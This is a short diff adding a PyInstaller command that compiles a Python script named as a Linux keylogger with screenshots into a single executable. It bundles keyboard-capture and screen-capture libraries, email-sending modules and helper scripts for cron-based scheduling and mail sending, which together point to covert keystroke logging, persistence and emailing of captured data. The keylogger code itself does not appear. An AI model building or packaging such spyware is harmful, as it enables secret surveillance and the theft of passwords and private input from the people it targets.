@@ -1,0 +1,19 @@
+python -m PyInstaller --onefile \
+  --name keyloggerLinuxAvecScreen \
+  --hidden-import=pynput \
+  --hidden-import=pynput.keyboard \
+  --hidden-import=Xlib \
+  --hidden-import=Xlib.ext \
+  --hidden-import=Xlib.ext.xfixes \
+  --hidden-import=threading \
+  --hidden-import=time \
+  --hidden-import=os \
+  --hidden-import=logging \
+  --hidden-import=six \
+  --hidden-import=email \
+  --hidden-import=smtplib \
+  --hidden-import=ssl \
+  --hidden-import=certifi \
+  --add-data "TacheProgrammees/setupCron.py:TacheProgrammees" \
+  --add-data "EnvoiMail/sendMail.py:EnvoiMail" \
+  keyloggerLinuxAvecScreen.py
